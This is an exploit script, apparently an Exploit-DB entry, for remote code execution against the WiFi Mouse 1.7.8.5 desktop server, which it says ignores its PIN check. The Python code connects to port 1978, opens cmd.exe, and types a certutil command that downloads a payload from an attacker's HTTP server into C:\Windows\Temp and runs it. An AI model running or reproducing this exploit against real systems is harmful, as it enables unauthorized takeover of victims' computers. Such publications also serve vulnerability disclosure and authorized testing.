# Exploit Title: WiFi Mouse 1.7.8.5 - Remote Code Execution
# Date: 25-02-2021
# Author: H4rk3nz0
# Vendor Homepage: http://necta.us/
# Software Link: http://wifimouse.necta.us/#download
# Version: 1.7.8.5
# Tested on: Windows Enterprise Build 17763

# Desktop Server software used by mobile app has PIN option which does not to prevent command input.
# Connection response will be 'needpassword' which is only interpreted by mobile app and prompts for PIN input.

#!/usr/bin/python

from socket import socket, AF_INET, SOCK_STREAM
from time import sleep
import sys
import string

target = socket(AF_INET, SOCK_STREAM)
port = 1978

try:
	rhost = sys.argv[1]
	lhost = sys.argv[2]
	payload = sys.argv[3]
except:
	print("USAGE: python " + sys.argv[0]+ " <target-ip> <local-http-server-ip> <payload-name>")
	exit()


characters={
	"A":"41","B":"42","C":"43","D":"44","E":"45","F":"46","G":"47","H":"48","I":"49","J":"4a","K":"4b","L":"4c","M":"4d","N":"4e",
	"O":"4f","P":"50","Q":"51","R":"52","S":"53","T":"54","U":"55","V":"56","W":"57","X":"58","Y":"59","Z":"5a",
	"a":"61","b":"62","c":"63","d":"64","e":"65","f":"66","g":"67","h":"68","i":"69","j":"6a","k":"6b","l":"6c","m":"6d","n":"6e",
	"o":"6f","p":"70","q":"71","r":"72","s":"73","t":"74","u":"75","v":"76","w":"77","x":"78","y":"79","z":"7a",
	"1":"31","2":"32","3":"33","4":"34","5":"35","6":"36","7":"37","8":"38","9":"39","0":"30",
	" ":"20","+":"2b","=":"3d","/":"2f","_":"5f","<":"3c",
	">":"3e","[":"5b","]":"5d","!":"21","@":"40","#":"23","$":"24","%":"25","^":"5e","&":"26","*":"2a",
	"(":"28",")":"29","-":"2d","'":"27",'"':"22",":":"3a",";":"3b","?":"3f","`":"60","~":"7e",
	"\\":"5c","|":"7c","{":"7b","}":"7d",",":"2c",".":"2e"}


def openCMD():
	target.sendto("6f70656e66696c65202f432f57696e646f77732f53797374656d33322f636d642e6578650a".decode("hex"), (rhost,port)) # openfile /C/Windows/System32/cmd.exe

def SendString(string):
	for char in string:
		target.sendto(("7574663820" + characters[char] + "0a").decode("hex"),(rhost,port)) # Sends Character hex with packet padding
		sleep(0.03)

def SendReturn():
	target.sendto("6b657920203352544e".decode("hex"),(rhost,port)) # 'key 3RTN' - Similar to 'Remote Mouse' mobile app
	sleep(0.5)

def exploit():
	print("[+] 3..2..1..")
	sleep(2)
	openCMD()
	print("[+] *Super fast hacker typing*")
	sleep(1)
	SendString("certutil.exe -urlcache -f http://" + lhost + "/" + payload + " C:\\Windows\\Temp\\" + payload)
	SendReturn()
	print("[+] Retrieving payload")
	sleep(3)
	SendString("C:\\Windows\\Temp\\" + payload)
	SendReturn()
	print("[+] Done! Check Your Listener?")


def main():
	target.connect((rhost,port))
	exploit()
	target.close()
	exit()

if __name__=="__main__":
	main()